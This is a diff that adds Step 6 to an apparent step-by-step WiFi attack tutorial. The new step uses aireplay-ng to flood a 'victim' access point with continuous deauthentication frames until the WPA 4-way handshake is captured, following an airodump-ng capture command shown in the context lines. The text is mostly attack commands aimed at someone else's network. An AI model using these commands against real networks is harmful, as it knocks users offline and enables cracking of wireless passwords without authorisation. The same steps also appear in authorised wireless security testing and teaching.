@@ -46,3 +46,10 @@ sudo airodump-ng -c <channel-number> --bssid <MAC-address-of-victim-machine> -w 
 ```
 <img src="./images/step-5-check-mac-addresses-connected-to-selected-wifi.png"></img>
 
+## Step-6: Start Sending De-authentication Frames
+In this step, using `aireplay-ng` you can **start sending de-auth frames** to victim's machine until 4-way handshake is captured.<br>
+Command used to **send de-auth frames** is -<br>
+```
+aireplay-ng -0 0 -a <MAC-address-of-victim-machine> <wireless-connection-name>
+```
+<img src="./images/step-6-send-deauth-packets.png"></img>
